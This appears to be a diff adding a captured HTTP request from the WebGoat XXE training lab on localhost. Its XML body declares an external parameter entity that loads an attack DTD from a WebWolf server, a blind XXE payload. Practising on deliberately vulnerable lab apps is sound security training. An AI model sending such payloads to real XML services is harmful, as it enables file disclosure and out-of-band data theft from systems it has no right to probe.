@@ -1,0 +1,21 @@
+POST /WebGoat/xxe/simple HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Length: 172
+sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
+Accept: */*
+Content-Type: application/xml
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Origin: http://127.0.0.1:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1:8080/WebGoat/start.mvc?username=location
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=UB6carQbO85SkC3tntO5yUK_3RDABVFWY7Hq0Z6i
+Connection: close
+
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/files/location/attack.dtd">%remote;]><comment><text>test&ping;</text></comment>
